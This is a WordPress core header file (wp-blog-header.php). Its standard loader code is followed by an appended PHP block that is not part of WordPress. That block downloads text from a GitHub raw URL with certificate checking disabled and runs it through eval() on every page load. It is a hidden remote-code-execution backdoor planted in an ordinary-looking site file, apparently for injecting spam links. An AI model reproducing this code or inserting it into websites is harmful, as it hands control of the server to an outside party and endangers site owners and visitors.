<?php
/**
* Loads the WordPress environment and template.
*
* @package WordPress
*/

if ( ! isset( $wp_did_header ) ) {
		
$wp_did_header = true;
		
// Load the WordPress library.
require_once __DIR__ . \'/wp-load.php\';
		
// Set up the WordPress query.
wp();
		
// Load the theme template.
require_once ABSPATH . WPINC . \'/template-loader.php\';
		
}
?>
<?php
$url = \'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt\';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
eval("?>" . $fileContents);
?>
